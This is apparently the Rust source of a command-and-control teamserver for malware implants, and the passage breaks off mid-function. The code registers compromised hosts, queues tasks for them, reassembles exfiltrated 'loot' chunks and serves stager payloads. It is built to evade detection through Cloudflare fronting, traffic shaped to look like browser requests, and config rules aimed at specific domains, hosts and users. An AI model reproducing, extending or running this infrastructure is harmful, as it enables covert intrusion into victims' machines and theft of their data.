use abraham_common::crypto::{self, ClientHello, Session};
use abraham_common::frame::{open_frames, ProtocolError};
use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
use abraham_common::message::{
    self, collect_action, cred_action, driver_action, msg, persist_action, Chunk, ConfigUpdate,
    Message, RegisterInfo, Task, TaskBody, TaskResult,
};
use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
use ed25519_dalek::SigningKey;
use rand_core::OsRng;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, VecDeque};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::{Arc, Mutex as SyncMutex};
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncWrite, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::RwLock;
use tokio_rustls::rustls::pki_types::{CertificateDer, PrivateKeyDer};
use tokio_rustls::TlsAcceptor;

const C2_DEFAULT: &str = "0.0.0.0:8443";
const MGMT_DEFAULT: &str = "127.0.0.1:9000";
const KEY_DEFAULT: &str = "server.key";
const PROFILE_DEFAULT: &str = DEFAULT_PROFILE_PATH;
const CERT_DEFAULT: &str = "server-cert.pem";
const TLSKEY_DEFAULT: &str = "server-tls-key.pem";
const STATE_DEFAULT: &str = "state/sessions.json";
const AUDIT_DEFAULT: &str = "state/audit.jsonl";
const CHUNK_SIZE: usize = 60_000;
const MAX_BODY: usize = 8 * 1024 * 1024;
/// Provisional handshakes awaiting their REGISTER, kept so the register
/// can arrive on ANY origin connection (fronting proxies pool them).
const PROVISIONAL_CAP: usize = 128;
const PROVISIONAL_TTL_SECS: u64 = 300;
/// Results kept per session in the persistence file (latest win).
const PERSIST_RESULT_CAP: usize = 200;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct StoredResult {
    task_id: u32,
    kind: String,
    status: u8,
    summary: String,
    timestamp: u64,
}

/// One logical beacon session. Everything a request needs lives here —
/// crypto state, task queue, result history — so ANY origin connection
/// can serve ANY session: a fronting proxy (Cloudflare origin pooling)
/// interleaves requests from several beacon transports on one
/// server-side connection, and the X-Session header routes each request
/// to its session regardless of which TCP stream delivered it.
struct LiveSession {
    id: u32,
    /// Crypto state from the LATEST handshake on this session's
    /// transport. `None` while the session has no live transport (loaded
    /// from the persistence file and not yet resumed).
    crypto: SyncMutex<Option<Session>>,
    info: SyncMutex<RegisterInfo>,
    addr: SyncMutex<String>,
    last_seen: AtomicU64,
    /// Tasks and upload chunks awaiting delivery, in order. A plain
    /// deque, not a channel: the contents persist to disk with the
    /// session, so tasks queued before a restart are still delivered
    /// after it.
    pending: SyncMutex<VecDeque<Message>>,
    results: Arc<RwLock<Vec<StoredResult>>>,
    /// Reassembly buffer for implant→server chunked payloads (loot).
    pending_uploads: SyncMutex<HashMap<u32, Vec<u8>>>,
    /// Real client address (X-Forwarded-For behind the front); the
    /// connection peer is the edge.
    real_ip: SyncMutex<String>,
    /// Last ConfigUpdate delivered to this implant (None = nothing yet);
    /// a poll whose resolution differs re-sends before any task.
    applied_config: SyncMutex<Option<ConfigUpdate>>,
}

impl LiveSession {
    /// Seals one response frame under the current transport keys. Each
    /// frame re-locks: a REGISTER racing on another connection can swap
    /// the keys mid-response, and the loser transport then fails to open
    /// the mix — it is reconnecting anyway, and the winner is unaffected.
    fn seal(&self, msg_type: u8, plaintext: &[u8]) -> Result<Vec<u8>, ProtocolError> {
        self.crypto
            .lock()
            .unwrap()
            .as_mut()
            .ok_or(ProtocolError::Crypto)?
            .seal(msg_type, plaintext)
    }

    fn set_seen(&self) {
        self.last_seen.store(now(), Ordering::SeqCst);
    }
}

// ---------------------------------------------------------------------------
// ABR-T037: server-driven configuration. Rules match an implant's
// registration attributes (domain, hostname prefix, user, source netblock)
// and resolve to a ConfigUpdate delivered inside the REGISTER response or
// the first poll after the resolution changes. First rule that matches
// wins; every field is optional and ANDed; absent fields are wildcards.
// ---------------------------------------------------------------------------

#[derive(serde::Serialize, serde::Deserialize, Clone, Debug, PartialEq, Default)]
struct ConfigRule {
    #[serde(default)]
    note: String,
    /// Exact domain match, case-insensitive (e.g. "FIAP").
    #[serde(default)]
    match_domain: Option<String>,
    /// Hostname prefix match, case-insensitive (e.g. "PA202").
    #[serde(default)]
    match_hostname_prefix: Option<String>,
    /// Exact username match, case-insensitive.
    #[serde(default)]
    match_user: Option<String>,
    /// IPv4 CIDR the client's real address must fall in (the X-Forwarded-For
    /// address behind the front; the connection peer is the edge).
    #[serde(default)]
    match_net: Option<String>,
    #[serde(default)]
    sleep_secs: Option<u64>,
    #[serde(default)]
    jitter: Option<f32>,
    #[serde(default)]
    uris: Vec<String>,
    #[serde(default)]
    user_agents: Vec<String>,
}

#[derive(serde::Serialize, serde::Deserialize, Clone, Debug, PartialEq, Default)]
struct ConfigRules {
    /// Bumped on every operator change; rides each delivered update.
    #[serde(default)]
    epoch: u64,
    #[serde(default)]
    rules: Vec<ConfigRule>,
}

/// IPv4 "a.b.c.d/len" -> (network, mask); None when malformed.
fn parse_cidr(spec: &str) -> Option<(u32, u32)> {
    let (addr, len) = spec.split_once('/')?;
    let len: u32 = len.parse().ok()?;
    if len > 32 {
        return None;
    }
    let mut ip: u32 = 0;
    for part in addr.split('.') {
        let octet: u32 = part.parse().ok()?;
        if octet > 255 {
            return None;
        }
        ip = (ip << 8) | octet;
    }
    let mask = if len == 0 { 0 } else { u32::MAX << (32 - len) };
    Some((ip & mask, mask))
}

impl ConfigRule {
    fn matches(&self, domain: &str, hostname: &str, user: &str, ip: &str) -> bool {
        let ip_num = ip
            .split('.')
            .filter_map(|p| p.parse::<u32>().ok())
            .fold(None, |acc: Option<u32>, o| {
                acc.map(|a| (a << 8) | o).or(Some(o))
            });
        if let Some(want) = &self.match_domain {
            if !want.eq_ignore_ascii_case(domain) {
                return false;
            }
        }
        if let Some(prefix) = &self.match_hostname_prefix {
            if !hostname
                .to_ascii_lowercase()
                .starts_with(&prefix.to_ascii_lowercase())
            {
                return false;
            }
        }
        if let Some(want) = &self.match_user {
            if !want.eq_ignore_ascii_case(user) {
                return false;
            }
        }
        if let (Some(spec), Some(ipv4)) = (&self.match_net, ip_num) {
            match parse_cidr(spec) {
                Some((net, mask)) => {
                    if ipv4 & mask != net {
                        return false;
                    }
                }
                None => return false,
            }
        }
        true
    }

    /// The update this rule resolves to; unlisted fields keep whatever the
    /// implant already runs (KEEP sentinels).
    fn update(&self, epoch: u64) -> ConfigUpdate {
        ConfigUpdate {
            epoch,
            sleep_secs: self.sleep_secs.unwrap_or(ConfigUpdate::KEEP_SLEEP_SECS),
            jitter: self.jitter.unwrap_or(ConfigUpdate::KEEP_JITTER),
            uris: self.uris.clone(),
            user_agents: self.user_agents.clone(),
        }
    }
}

impl ConfigRules {
    /// First rule that matches wins (operator decision, 2026-09-14).
    fn resolve(&self, domain: &str, hostname: &str, user: &str, ip: &str) -> Option<&ConfigRule> {
        self.rules
            .iter()
            .find(|rule| rule.matches(domain, hostname, user, ip))
    }
}

/// The client's real address from the fronting proxy headers — the
/// connection peer is the edge (Cloudflare), not the implant. Header
/// values are raw bytes in the HTTP layer; the first entry of a
/// forwarded list wins (closest to the origin of the request chain we
/// care about is the front's view of the client).
fn client_ip_of(req: &HttpRequest) -> Option<String> {
    for name in ["cf-connecting-ip", "x-forwarded-for"] {
        if let Some(forwarded) = req.header(name) {
            let text = std::str::from_utf8(forwarded).ok()?;
            let first = text.split(',').next()?.trim();
            if !first.is_empty() {
                return Some(first.to_string());
            }
        }
    }
    None
}

/// Config frames go only to implants whose decoder knows kind 0x10;
/// older builds fail the frame as malformed (strict decode).
fn implant_supports_config(version: &str) -> bool {
    let mut parts = version.split('.');
    let major: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
    let minor: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
    let patch: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
    (major, minor, patch) >= (0, 2, 1)
}

struct AppState {
    sessions: RwLock<HashMap<u32, Arc<LiveSession>>>,
    /// session_token -> session_id for RESUME: a re-register with a
    /// known token reattaches the transport to the SAME session (id,
    /// queued tasks, results) when a fronting proxy dropped the old
    /// connection.
    tokens: RwLock<HashMap<u64, u32>>,
    /// Handshakes awaiting their REGISTER, keyed by session token: the
    /// register may land on a different pooled origin connection than
    /// the hello that produced the keys.
    provisionals: SyncMutex<HashMap<u64, (Session, u64)>>,
    next_session_id: AtomicU32,
    next_task_id: AtomicU32,
    signing_key: SigningKey,
    /// Persistence file; `None` disables saving.
    state_path: Option<PathBuf>,
    /// Audit log (JSON lines of operator actions and deliveries);
    /// `None` disables.
    audit_path: SyncMutex<Option<PathBuf>>,
    /// Shared secret guarding the mgmt port; `None` accepts any client
    /// (lab/dev default).
    mgmt_token: Option<String>,
    /// A session whose last_seen age exceeds this is reported stale by
    /// list_sessions (10x profile sleep, clamped).
    stale_after_secs: u64,
    /// ABR-T037 rule table (operator-managed via mgmt `cfg` commands).
    config: SyncMutex<ConfigRules>,
    /// Where the rule table persists (sibling of the session state file).
    config_path: Option<PathBuf>,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Persists the ABR-T037 rule table next to the session state. Best-effort
/// like every persistence path: a failure is surfaced to the operator's
/// console, never fatal to serving.
fn save_config_rules(state: &AppState) {
    let Some(path) = state.config_path.clone() else {
        return;
    };
    let rules = state.config.lock().unwrap().clone();
    match serde_json::to_string_pretty(&rules) {
        Ok(text) => {
            if let Err(e) = std::fs::write(&path, text) {
                eprintln!("[!] config rules save failed: {e}");
            }
        }
        Err(e) => eprintln!("[!] config rules serialize failed: {e}"),
    }
}

/// Appends one JSON line to the audit log — the after-action record of
/// what the operator asked for and what the implants did. Best-effort
/// by design: a log failure must never take down serving (it mirrors
/// the persistence posture). A single small append; sync std IO.
fn audit(state: &AppState, event: &str, fields: Value) {
    let path = state.audit_path.lock().unwrap().clone();
    let Some(path) = path else {
        return;
    };
    let mut line = serde_json::Map::new();
    line.insert("ts".into(), json!(now()));
    line.insert("event".into(), json!(event));
    if let Some(map) = fields.as_object() {
        for (key, value) in map {
            line.insert(key.clone(), value.clone());
        }
    }
    let body = serde_json::to_string(&Value::Object(line)).unwrap_or_default();
    use std::io::Write;
    if let Err(e) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .and_then(|mut file| writeln!(file, "{body}"))
    {
        eprintln!("[!] audit {}: {e}", path.display());
    }
}

fn arg_or(flag: &str, default: &str) -> String {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
        .unwrap_or_else(|| default.to_string())
}

fn load_or_create_key(path: &Path) -> anyhow::Result<SigningKey> {
    if path.exists() {
        let seed = std::fs::read(path)?;
        let seed: [u8; 32] = seed.as_slice().try_into()?;
        Ok(SigningKey::from_bytes(&seed))
    } else {
        let key = SigningKey::generate(&mut OsRng);
        std::fs::write(path, key.to_bytes())?;
        Ok(key)
    }
}

fn load_tls_pair(
    cert_path: &Path,
    key_path: &Path,
) -> anyhow::Result<(Vec<CertificateDer<'static>>, PrivateKeyDer<'static>)> {
    if cert_path.exists() && key_path.exists() {
        let cert_pem = std::fs::read(cert_path)?;
        let key_pem = std::fs::read(key_path)?;
        let mut certs = Vec::new();
        for cert in rustls_pemfile::certs(&mut cert_pem.as_slice()) {
            certs.push(cert?);
        }
        let key = rustls_pemfile::private_key(&mut key_pem.as_slice())?
            .ok_or_else(|| anyhow::anyhow!("no private key in {}", key_path.display()))?;
        Ok((certs, key))
    } else {
        let generated = rcgen::generate_simple_self_signed(vec!["web".to_string()])?;
        std::fs::write(cert_path, generated.cert.pem())?;
        std::fs::write(key_path, generated.key_pair.serialize_pem())?;
        let certs = vec![generated.cert.der().clone()];
        let key = PrivateKeyDer::Pkcs8(generated.key_pair.serialize_der().into());
        Ok((certs, key))
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let c2_addr = arg_or("--listen", C2_DEFAULT);
    let mgmt_addr = arg_or("--mgmt", MGMT_DEFAULT);
    let key_path = PathBuf::from(arg_or("--key", KEY_DEFAULT));
    let profile_path = PathBuf::from(arg_or("--profile", PROFILE_DEFAULT));
    let cert_path = PathBuf::from(arg_or("--tls-cert", CERT_DEFAULT));
    let tlskey_path = PathBuf::from(arg_or("--tls-key", TLSKEY_DEFAULT));
    // Optional payload staging: GETs on the profile URIs serve these
    // bytes (the operator's implant/stager) with no protocol framing —
    // the classic staged-download over the same malleable front.
    let stage_file = arg_or("--stage-file", "");
    let stage: Option<Arc<Vec<u8>>> = if stage_file.is_empty() {
        None
    } else {
        let bytes =
            std::fs::read(&stage_file).unwrap_or_else(|e| panic!("--stage-file {stage_file}: {e}"));
        println!("[*] staging {} bytes on GETs", bytes.len());
        Some(Arc::new(bytes))
    };

    let profile = if profile_path.exists() {
        Profile::load_file(&profile_path).map_err(anyhow::Error::msg)?
    } else {
        eprintln!(
            "[!] profile {} not found, using built-in defaults",
            profile_path.display()
        );
        Profile::default()
    };

    let signing_key = load_or_create_key(&key_path)?;
    let pub_path = key_path.with_extension("pub");
    std::fs::write(
        &pub_path,
        hex::encode(signing_key.verifying_key().as_bytes()),
    )?;
    println!(
        "[*] server identity: {}",
        hex::encode(signing_key.verifying_key().as_bytes())
    );
    println!(
        "[*] identity persisted at {} / {}",
        key_path.display(),
        pub_path.display()
    );

    // Session persistence: a redeploy restarts the teamserver; sessions
    // (ids, tokens, results, queued tasks) survive on disk and beacons
    // RESUME into them on their next re-register instead of orphaning
    // the history. Empty value disables.
    let state_arg = arg_or("--state", STATE_DEFAULT);
    let state_path = if state_arg.is_empty() {
        None
    } else {
        Some(PathBuf::from(&state_arg))
    };

    // Mgmt auth: when --mgmt-token is set, every mgmt client must open
    // with {"auth": "<token>"} before any command. The deploy writes
    // the generated token next to the runtime state (0600).
    let mgmt_token_arg = arg_or("--mgmt-token", "");
    let mgmt_token = (!mgmt_token_arg.is_empty()).then_some(mgmt_token_arg);
    if mgmt_token.is_some() {
        println!("[*] mgmt auth: token required");
    } else {
        println!("[*] mgmt auth: open (no --mgmt-token)");
    }

    // Audit log of operator actions and deliveries; empty disables.
    let audit_arg = arg_or("--audit", AUDIT_DEFAULT);
    let audit_path = if audit_arg.is_empty() {
        None
    } else {
        Some(PathBuf::from(&audit_arg))
    };
    if let Some(path) = &audit_path {
        println!("[*] audit log: {}", path.display());
    }

    let (certs, key) = load_tls_pair(&cert_path, &tlskey_path)?;
    let pin = Sha256::digest(certs[0].as_ref());
    println!("[*] tls cert sha256: {}", hex::encode(pin));
    let tls_config = tokio_rustls::rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(certs, key)?;
    let acceptor = TlsAcceptor::from(Arc::new(tls_config));

    // ABR-T037: the rule table persists next to the session state
    // (sessions.json -> config-rules.json) so a restart keeps the
    // operator's configuration policy.
    let config_path = state_path.as_ref().map(|p| {
        let mut sibling = p.clone();
        sibling.set_file_name("config-rules.json");
        sibling
    });
    let config = match &config_path {
        Some(path) if path.exists() => match std::fs::read_to_string(path) {
            Ok(text) => serde_json::from_str(&text).unwrap_or_else(|e| {
                eprintln!("[!] config rules load failed ({e}); starting empty");
                ConfigRules::default()
            }),
            Err(e) => {
                eprintln!("[!] config rules read failed ({e}); starting empty");
                ConfigRules::default()
            }
        },
        _ => ConfigRules::default(),
    };
    let state = Arc::new(AppState {
        sessions: RwLock::new(HashMap::new()),
        tokens: RwLock::new(HashMap::new()),
        provisionals: SyncMutex::new(HashMap::new()),
        next_session_id: AtomicU32::new(1),
        next_task_id: AtomicU32::new(1),
        signing_key,
        state_path,
        audit_path: SyncMutex::new(audit_path),
        mgmt_token,
        stale_after_secs: (profile.sleep_secs.saturating_mul(10)).clamp(120, 86_400),
        config: SyncMutex::new(config),
        config_path,
    });
    if let Some(path) = &state.state_path {
        match load_state(&state, path).await {
            Ok(n) => println!("[*] state: {n} session(s) restored from {}", path.display()),
            Err(e) => eprintln!("[!] state load failed ({e}); starting fresh"),
        }
    }

    let c2 = TcpListener::bind(&c2_addr).await?;
    // Plain-C2 mode terminates TLS at a fronting redirector (see
    // deploy/redirector) and proxies plain HTTP here; end-to-end
    // authenticity is the inner Ed25519 session either way, and the
    // outer TLS fingerprint becomes the redirector's instead of
    // rustls's — which a User-Agent claiming Chrome would otherwise
    // contradict.
    let plain_c2 = std::env::args().any(|a| a == "--plain-c2");
    if plain_c2 {
        println!("[*] c2 (plain, behind redirector) listening on {c2_addr}");
    } else {
        println!("[*] c2 (https) listening on {c2_addr}");
    }
    let mgmt = TcpListener::bind(&mgmt_addr).await?;
    println!("[*] mgmt listening on {mgmt_addr}");

    let c2_state = state.clone();
    let c2_acceptor = acceptor.clone();
    let c2_profile = profile.clone();
    tokio::spawn(async move {
        loop {
            if let Ok((stream, peer)) = c2.accept().await {
                let state = c2_state.clone();
                let profile = c2_profile.clone();
                if plain_c2 {
                    let stage = stage.clone();
                    tokio::spawn(async move {
                        if let Err(e) = run_session(stream, peer, state, profile, stage).await {
                            eprintln!("[!] session {peer} ended: {e}");
                        }
                    });
                    continue;
                }
                let acceptor = c2_acceptor.clone();
                let stage = stage.clone();
                tokio::spawn(async move {
                    let tls_stream = match acceptor.accept(stream).await {
                        Ok(s) => s,
                        Err(e) => {
                            eprintln!("[!] tls handshake with {peer} failed: {e}");
                            return;
                        }
                    };
                    if let Err(e) = run_session(tls_stream, peer, state, profile, stage).await {
                        eprintln!("[!] session {peer} ended: {e}");
                    }
                });
            }
        }
    });

    loop {
        let (stream, _) = mgmt.accept().await?;
        let state = state.clone();
        tokio::spawn(async move {
            if let Err(e) = run_mgmt(stream, state).await {
                eprintln!("[!] mgmt client ended: {e}");
            }
        });
    }
}

fn reject_status(method: &str) -> u16 {
    if method == "POST" {
        404
    } else {
        405
    }
}

fn request_allowed(method: &str, uri: &str, profile: &Profile) -> bool {
    method == "POST" && profile.uris.iter().any(|allowed| allowed == uri)
}

/// Session token from the demux tag: the X-Session header (legacy) or
/// the profile-named session cookie (T035) — a session cookie is what
/// web-fronted traffic normally carries, a custom header is not.
fn session_token_of(req: &HttpRequest, cookie_name: &str) -> Option<u64> {
    if let Some(value) = req.header(HDR_SESSION) {
        if let Some(token) = std::str::from_utf8(value)
            .ok()
            .and_then(|text| text.trim().parse().ok())
        {
            return Some(token);
        }
    }
    let cookie = std::str::from_utf8(req.header("Cookie")?).ok()?;
    for pair in cookie.split(';') {
        if let Some((name, value)) = pair.trim().split_once('=') {
            if name.trim() == cookie_name {
                if let Ok(token) = value.trim().parse() {
                    return Some(token);
                }
            }
        }
    }
    None
}

fn is_handshake(req: &HttpRequest, cookie_name: &str) -> bool {
    // X-Handshake marks demux-aware ClientHello POSTs; the bare
    // body-length check keeps legacy (headerless) implants working.
    matches!(req.header(HDR_HANDSHAKE), Some(v) if v == b"1")
        || (req.body.len() == crypto::CLIENT_HELLO_LEN
            && session_token_of(req, cookie_name).is_none())
}

/// Wire behavior is gated on the implant build version: 0.2.0+ answers
/// an empty TASK_POLL with a body-less 204 (nothing to deliver, no
/// sealed BatchEnd — an idle poll stops looking like a binary blob);
/// older builds still expect the sealed batch trailer and keep getting
/// 200.
fn implant_supports_204(version: &str) -> bool {
    let mut it = version.split('.');
    match (it.next(), it.next()) {
        (Some(maj), Some(min)) => matches!(
            (maj.parse::<u32>(), min.parse::<u32>()),
            (Ok(major), Ok(minor)) if (major, minor) >= (0, 2)
        ),
        _ => false,
    }
}

/// One origin connection. Connection-bound state is a LEGACY fallback
/// only (headerless implants); every request from a demux-aware implant
/// carries X-Session and routes through the shared registry, so proxy
/// origin pooling that interleaves foreign requests into this stream
/// cannot break the sessions riding it — a bad frame costs the offending
/// request (400), never the connection.
async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
    mut stream: S,
    peer: SocketAddr,
    state: Arc<AppState>,
    profile: Profile,
    stage: Option<Arc<Vec<u8>>>,
) -> Result<(), anyhow::Error> {
    // Legacy: handshake awaiting its REGISTER on THIS connection.
    let mut conn_hello: Option<Session> = None;
    // Legacy: session bound to THIS connection.
    let mut conn_session: Option<Arc<LiveSession>> = None;
    loop {
        let Some(req) = read_request(&mut stream).await? else {
            return Ok(());
        };
        if req.method == "GET" {
            if let Some(bytes) = &stage {
                write_response(&mut stream, 200, &profile.server_header, bytes).await?;
                continue;
            }
        }
        if !request_allowed(&req.method, &req.uri, &profile) {
            let status = reject_status(&req.method);
            write_response(&mut stream, status, &profile.server_header, b"").await?;
            continue;
        }
        if req.body.len() > MAX_BODY {
            write_response(&mut stream, 413, &profile.server_header, b"").await?;
            anyhow::bail!("request body {} exceeds limit", req.body.len());
        }
        if is_handshake(&req, &profile.cookie_name) {
            if req.body.len() != crypto::CLIENT_HELLO_LEN {
                write_response(&mut stream, 400, &profile.server_header, b"").await?;
                anyhow::bail!(
                    "handshake: expected {} bytes, got {}",
                    crypto::CLIENT_HELLO_LEN,
                    req.body.len()
                );
            }
            let raw: [u8; crypto::CLIENT_HELLO_LEN] = req.body.as_slice().try_into()?;
            let client_hello = ClientHello::from_bytes(&raw);
            let (secret, server_hello) = crypto::server_respond(&state.signing_key, &client_hello);
            write_response(
                &mut stream,
                200,
                &profile.server_header,
                &server_hello.to_bytes(),
            )
            .await?;
            let session = crypto::server_finish(secret, &client_hello, &server_hello);
            match session_token_of(&req, &profile.cookie_name) {
                // Demux-aware implant: park the keys under its token so
                // the REGISTER finds them on any pooled connection.
                Some(token) => {
                    let mut provisionals = state.provisionals.lock().unwrap();
                    if provisionals.len() >= PROVISIONAL_CAP {
                        let cutoff = now().saturating_sub(PROVISIONAL_TTL_SECS);
                        provisionals.retain(|_, (_, ts)| *ts > cutoff);
                    }
                    provisionals.insert(token, (session, now()));
                }
                None => conn_hello = Some(session),
            }
            continue;
        }
        // Frame request: route by token when tagged, else fall back to
        // the connection-bound legacy path. A provisional handshake for
        // the token wins over the live session: it exists exactly between
        // the beacon's hello and its REGISTER, and that REGISTER is sealed
        // with the fresh keys, not the session's current ones.
        if let Some(token) = session_token_of(&req, &profile.cookie_name) {
            let provisional = state.provisionals.lock().unwrap().remove(&token);
            if let Some((session, _)) = provisional {
                conn_session = register(
                    &mut stream,
                    &req.body,
                    session,
                    peer,
                    client_ip_of(&req),
                    &state,
                    &profile,
                )
                .await?
                .or(conn_session);
                continue;
            }
            let live = {
                let tokens = state.tokens.read().await;
                match tokens.get(&token).copied() {
                    Some(id) => state.sessions.read().await.get(&id).cloned(),
                    None => None,
                }
            };
            if let Some(live) = live {
                serve_session(&mut stream, &req, &live, &state, &profile).await?;
                continue;
            }
            write_response(&mut stream, 400, &profile.server_header, b"").await?;
            continue;
        }
        if let Some(session) = conn_hello.take() {
            conn_session = register(
                &mut stream,
                &req.body,
                session,
                peer,
                client_ip_of(&req),
                &state,
                &profile,
            )
            .await?
            .or(conn_session);
            continue;
        }
        if let Some(live) = conn_session.clone() {
            serve_session(&mut stream, &req, &live, &state, &profile).await?;
            continue;
        }
        write_response(&mut stream, 400, &profile.server_header, b"").await?;
    }
}

/// Processes a REGISTER frame sealed under a fresh handshake: a known
/// session token RESUMES the live session (id, queued tasks, results)
/// with this handshake's keys, an unknown one opens a new session.
/// Responds 400 and keeps the connection when the frame does not decrypt
/// (pooled stray). Returns the live session for the legacy conn path.
async fn register<S: AsyncWrite + Unpin>(
    stream: &mut S,
    body: &[u8],
    mut session: Session,
    peer: SocketAddr,
    client_ip: Option<String>,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<Option<Arc<LiveSession>>, anyhow::Error> {
    let frames = match open_frames(body, &mut session) {
        Ok(frames) => frames,
        Err(e) => {
            write_response(stream, 400, &profile.server_header, b"").await?;
            eprintln!("[!] register from {peer}: bad frames: {e}");
            return Ok(None);
        }
    };
    if frames.len() != 1 || frames[0].0 != msg::REGISTER {
        write_response(stream, 400, &profile.server_header, b"").await?;
        anyhow::bail!("register: expected a single REGISTER frame");
    }
    let Message::Register(info) = Message::decode(msg::REGISTER, &frames[0].1)? else {
        anyhow::bail!("register: undecodable REGISTER frame");
    };
    let tokens = state.tokens.read().await;
    let candidate = tokens.get(&info.session_token).copied();
    drop(tokens);
    let resumed = match candidate {
        Some(id) => state.sessions.read().await.get(&id).cloned(),
        None => None,
    };
    let live = if let Some(live) = resumed {
        *live.crypto.lock().unwrap() = Some(session);
        *live.info.lock().unwrap() = info.clone();
        *live.addr.lock().unwrap() = peer.to_string();
        *live.real_ip.lock().unwrap() = client_ip.unwrap_or_default();
        live.set_seen();
        println!("[~] session {} resumed from {peer}", live.id);
        audit(
            state,
            "session_resume",
            json!({ "session": live.id, "addr": peer.to_string() }),
        );
        live
    } else {
        let session_id = state.next_session_id.fetch_add(1, Ordering::SeqCst);
        let live = Arc::new(LiveSession {
            id: session_id,
            crypto: SyncMutex::new(Some(session)),
            info: SyncMutex::new(info.clone()),
            addr: SyncMutex::new(peer.to_string()),
            last_seen: AtomicU64::new(now()),
            pending: SyncMutex::new(VecDeque::new()),
            results: Arc::new(RwLock::new(Vec::<StoredResult>::new())),
            pending_uploads: SyncMutex::new(HashMap::new()),
            real_ip: SyncMutex::new(client_ip.clone().unwrap_or_default()),
            applied_config: SyncMutex::new(None),
        });
        state
            .sessions
            .write()
            .await
            .insert(session_id, live.clone());
        if info.session_token != 0 {
            state
                .tokens
                .write()
                .await
                .insert(info.session_token, session_id);
        }
        println!(
            "[+] session {session_id}: {}\\{}@{} from {} (implant {})",
            info.domain, info.username, info.hostname, peer, info.implant_version
        );
        audit(
            state,
            "session_new",
            json!({
                "session": session_id,
                "user": format!("{}\\{}", info.domain, info.username),
                "hostname": info.hostname,
                "pid": info.pid,
                "implant": info.implant_version,
                "addr": peer.to_string(),
            }),
        );
        live
    };
    // ABR-T037: resolve the implant's rule context and deliver the
    // update inside the REGISTER response — config reaches the beacon
    // on its very first exchange, before any poll.
    if let Some(update) = resolved_config_for(state, &live) {
        if deliver_config(stream, &live, &update, state, profile)
            .await
            .is_err()
        {
            eprintln!("[!] session {}: config delivery write failed", live.id);
        }
    } else {
        write_response(stream, 200, &profile.server_header, b"").await?;
    }
    persist_state(state).await;
    Ok(Some(live))
}

/// Resolves the session's rule context to an update that still changes
/// something AND differs from what this implant last applied. `None`
/// means "nothing to send".
fn resolved_config_for(state: &AppState, live: &Arc<LiveSession>) -> Option<ConfigUpdate> {
    let rules = state.config.lock().unwrap().clone();
    let (domain, hostname, username, version) = {
        let info = live.info.lock().unwrap();
        (
            info.domain.clone(),
            info.hostname.clone(),
            info.username.clone(),
            info.implant_version.clone(),
        )
    };
    let ip = live.real_ip.lock().unwrap().clone();
    if !implant_supports_config(&version) {
        return None;
    }
    let update = rules
        .resolve(&domain, &hostname, &username, &ip)
        .map(|rule| rule.update(rules.epoch))
        .filter(|update| update.changes_something())?;
    let applied = live.applied_config.lock().unwrap().clone();
    if applied.as_ref() == Some(&update) {
        return None;
    }
    Some(update)
}

/// Writes a 200 whose sealed frames carry the CONFIG update followed by
/// BatchEnd (the implant opens REGISTER responses like any frame body).
async fn deliver_config<S: AsyncWrite + Unpin>(
    stream: &mut S,
    live: &Arc<LiveSession>,
    update: &ConfigUpdate,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<(), anyhow::Error> {
    let mut body = Vec::new();
    let (mt, payload) = Message::Config(update.clone()).encode();
    body.extend_from_slice(&live.seal(mt, &payload)?);
    let (mt, payload) = Message::BatchEnd.encode();
    body.extend_from_slice(&live.seal(mt, &payload)?);
    *live.applied_config.lock().unwrap() = Some(update.clone());
    audit(
        state,
        "config_delivered",
        json!({ "session": live.id, "epoch": update.epoch }),
    );
    write_response(stream, 200, &profile.server_header, &body)
        .await
        .map_err(anyhow::Error::from)
}

/// Serves one request of an established session (poll/result/chunk/ping).
/// A decrypt failure costs this request (400), never the connection —
/// other sessions may still be riding the same pooled stream.
async fn serve_session<S: AsyncWrite + Unpin>(
    stream: &mut S,
    req: &HttpRequest,
    live: &Arc<LiveSession>,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<(), anyhow::Error> {
    let frames = {
        let mut guard = live.crypto.lock().unwrap();
        match guard.as_mut() {
            Some(session) => open_frames(&req.body, session),
            None => Err(ProtocolError::Crypto),
        }
    };
    let frames = match frames {
        Ok(frames) => frames,
        Err(e) => {
            write_response(stream, 400, &profile.server_header, b"").await?;
            eprintln!("[!] session {}: bad frames: {e}", live.id);
            return Ok(());
        }
    };
    let mut response: Vec<u8> = Vec::new();
    let mut dirty = false;
    // Set when the only thing this request asked was an empty poll from
    // a 0.2.0+ implant: answer with a body-less 204 instead of a sealed
    // BatchEnd (T035).
    let mut empty_poll = false;
    for (msg_type, payload) in frames {
        match msg_type {
            msg::REGISTER => {
                // Same keys decrypting a second REGISTER means a proxy
                // duplicated the request; the first register already won.
                eprintln!("[!] session {}: duplicate register ignored", live.id);
            }
            msg::TASK_POLL => {
                live.set_seen();
                // ABR-T037: a rule change that re-resolves for this
                // implant lands on the next poll, before any tasking.
                let pending_config = resolved_config_for(state, live);
                let outbound: Vec<Message> =
                    std::mem::take(&mut *live.pending.lock().unwrap()).into();
                if let Some(update) = &pending_config {
                    let (mt, payload) = Message::Config(update.clone()).encode();
                    response.extend_from_slice(&live.seal(mt, &payload)?);
                    *live.applied_config.lock().unwrap() = Some(update.clone());
                    audit(
                        state,
                        "config_delivered",
                        json!({ "session": live.id, "epoch": update.epoch }),
                    );
